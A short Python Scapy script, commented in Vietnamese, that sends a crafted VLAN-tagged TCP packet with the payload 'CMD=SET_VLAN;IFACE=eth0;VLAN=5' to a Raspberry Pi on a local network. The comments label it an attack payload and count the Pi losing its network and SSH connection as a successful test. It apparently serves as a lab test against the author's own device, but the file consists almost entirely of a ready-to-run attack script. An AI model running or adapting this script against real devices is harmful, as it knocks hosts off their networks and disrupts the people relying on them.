from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, Dot1Q
from colorama import Fore, Style, init

# ================== INIT ==================
init(autoreset=True)

# ================== CONFIG ==================

# Interface PC
# Windows: "Ethernet"
# Linux: "eth0", "enp0s3", ...
IFACE = "Ethernet"

# VLAN hiện tại của Raspberry Pi
CURRENT_VLAN = 1

# VLAN muốn ép Raspberry chuyển sang (sai → mất mạng)
TARGET_VLAN = 5

# IPv4
SRC_IPv4 = "192.168.1.100"   # IP PC
DST_IPv4 = "192.168.1.114"   # IP Raspberry

# MAC (có thể để None)
SRC_MAC = None
DST_MAC = None

# Port dịch vụ
SPORT = 13344
DPORT = 13344

# ================== PAYLOAD TẤN CÔNG ==================
PAYLOAD = f"CMD=SET_VLAN;IFACE=eth0;VLAN={TARGET_VLAN}"

# ================== BUILD PACKET ==================

def build_packet():
    pkt = (
        Ether(src=SRC_MAC, dst=DST_MAC)
        / Dot1Q(vlan=CURRENT_VLAN)
        / IP(src=SRC_IPv4, dst=DST_IPv4)
        / TCP(sport=SPORT, dport=DPORT, flags="PA")
        / PAYLOAD
    )
    return pkt

# ================== SEND ==================

def send_attack():
    print(Fore.YELLOW + "[*] Sending IPv4 VLAN change payload")
    print(Fore.CYAN + f"    VLAN {CURRENT_VLAN}  →  VLAN {TARGET_VLAN}")
    print(Fore.CYAN + f"    Payload: {PAYLOAD}")
    print("-" * 50)

    pkt = build_packet()
    pkt.show()

    sendp(pkt, iface=IFACE, verbose=1)

    print(Fore.GREEN + "[✓] Payload sent")
    print(Fore.RED + "[!] Nếu Raspberry Pi mất mạng / SSH rớt → TEST THÀNH CÔNG")

# ================== MAIN ==================

if __name__ == "__main__":
    send_attack()
